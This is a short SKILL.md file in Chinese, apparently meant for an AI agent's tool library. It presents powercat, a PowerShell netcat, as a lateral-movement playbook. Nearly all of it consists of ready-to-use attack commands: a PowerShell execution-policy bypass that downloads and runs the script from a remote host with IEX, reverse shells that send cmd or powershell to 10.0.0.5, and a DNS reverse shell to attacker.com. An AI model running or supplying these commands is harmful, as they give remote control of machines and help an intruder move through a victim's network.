---
name: powercat-netcat-ps
description: 渗透工具 skill:powercat 的安装、参数速查与攻击场景 playbook。当任务涉及 远程服务横向移动 需要调用 powercat 时使用。
when-to-use: 渗透工具 skill:powercat 的安装、参数速查与攻击场景 playbook。当任务涉及 远程服务横向移动 需要调用 powercat 时使用。
---

# powercat

- 攻击大类:C31 远程服务横向移动
- 上游仓库:https://github.com/besimorhino/powercat
- 上游 License:Apache-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/besimorhino/powercat
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `powershell -ep bypass -c 'IEX (New-Object Net.WebClient).DownloadString("http://vps/powercat.ps1"); powercat -l -p 4444 -e cmd'` | 监听 |
| `powercat -c 10.0.0.5 -p 4444 -e cmd` | 反弹 |
| `powercat -l -p 4444 -r dns:attacker.com` | DNS 反弹 |

## 攻击场景 Playbook

### Windows 原生 netcat

```bash
# 已有 shell 内: IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/powercat.ps1')
powercat -c 10.0.0.5 -p 443 -e powershell
```

## 注意事项

PowerShell 版 netcat,支持 TCP/UDP/DNS/SSL 反弹+文件传输,免安装单文件。
